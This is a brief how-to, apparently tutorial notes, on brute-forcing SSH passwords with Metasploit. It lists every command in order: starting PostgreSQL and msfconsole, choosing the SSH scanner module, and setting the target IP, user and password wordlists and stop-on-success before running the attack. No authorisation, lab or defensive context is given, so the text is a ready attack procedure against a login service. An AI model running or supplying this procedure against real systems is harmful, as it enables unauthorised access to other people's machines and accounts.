How to crack SSH passwords (Brute Force)

Start 'Postgresql' service (Install if needed with sudo apt install postgresql)

sudo service postgresql start

Start Metasploit (msfconsole)

Search for ssh modules

search ssh

Select 'SSH Scanner' from the list

use [# of SSH Scanner]

Type in the following lines of code to set the settings for the attack:

set rhosts [Target IP]

set stop_on_success true

set user_file [Path to file]

set password_file [Path to file]

set verbose true

Now, type run to begin the attack
